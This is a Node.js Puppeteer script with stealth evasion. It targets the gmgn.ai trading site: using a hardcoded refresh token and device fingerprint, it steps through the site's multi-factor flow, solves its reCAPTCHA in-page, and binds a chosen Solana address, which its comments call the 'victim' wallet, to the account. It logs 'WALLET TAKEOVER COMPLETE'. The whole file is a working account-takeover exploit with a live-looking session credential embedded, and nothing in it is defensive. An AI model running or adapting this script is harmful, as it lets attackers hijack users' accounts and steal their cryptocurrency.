const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const SITEKEY = '6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T';
const FULL_PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 CORRECT ORDER: fetch_captcha THEN solve reCAPTCHA');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 3000));
    
    const result = await page.evaluate(async (refresh, fullParams, target, sitekey) => {
        const log = [];
        
        // Step 1: Token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'token fail'};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('1. Token OK');
        
        // Step 2: Generate txn_id
        r = await fetch('/account/account/generate_mfa_params?' + fullParams, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
        });
        data = await r.json();
        if (data.code !== 0) return {error: 'mfa fail', data};
        const txnId = data.data.data.txn_id;
        log.push('2. txn_id: ' + txnId);
        
        // Step 3: FETCH_CAPTCHA — get request_id FIRST
        r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + fullParams, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
        });
        data = await r.json();
        if (data.code !== 0) return {error: 'fetch_captcha fail', data};
        const requestId = data.data.request_id;
        log.push('3. request_id: ' + requestId);
        
        // Step 4: NOW solve reCAPTCHA (AFTER fetch_captcha)
        await new Promise(resolve => {
            if (window.grecaptcha && window.grecaptcha.enterprise) { resolve(); return; }
            const s = document.createElement('script');
            s.src = 'https://www.recaptcha.net/recaptcha/enterprise.js?render=' + sitekey;
            s.onload = () => setTimeout(resolve, 2000);
            document.head.appendChild(s);
            setTimeout(resolve, 8000);
        });
        
        let captchaToken = null;
        try {
            captchaToken = await new Promise((resolve, reject) => {
                grecaptcha.enterprise.ready(async () => {
                    const t = await grecaptcha.enterprise.execute(sitekey, {action: 'bind_wallet'});
                    resolve(t);
                });
                setTimeout(() => reject('timeout'), 12000);
            });
        } catch(e) { return {error: 'captcha fail: ' + e, log}; }
        log.push('4. Captcha token: ' + captchaToken.substring(0, 40) + '...');
        
        // Step 5: VERIFY CAPTCHA with request_id from fetch_captcha
        r = await fetch('/account/mfa/txn/v1/verify_captcha?' + fullParams, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                txn_id: txnId,
                request_id: requestId,
                usage: 'bind_wallet',
                captcha_type: 'recaptcha_score',
                captcha_data: captchaToken
            })
        });
        data = await r.json();
        log.push('5. verify_captcha: code=' + data.code + ' msg=' + (data.message || ''));
        
        if (data.code === 0) {
            log.push('💀💀💀💀💀 CAPTCHA VERIFIED!!!');
            
            // Step 6: BIND VICTIM WALLET
            r = await fetch('/account/bind_wallet?' + fullParams, {
                method: 'POST', headers: h,
                body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
            });
            data = await r.json();
            log.push('6. BIND: ' + JSON.stringify(data));
            
            if (data.code === 0) {
                log.push('💀💀💀💀💀💀💀 WALLET TAKEOVER COMPLETE!!!');
            }
            
            return {log, captchaSolved: true, bindResult: data, txnId};
        }
        
        return {log, txnId, requestId, captchaToken: captchaToken.substring(0, 50)};
    }, FRESH_REFRESH, FULL_PARAMS, TARGET, SITEKEY);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
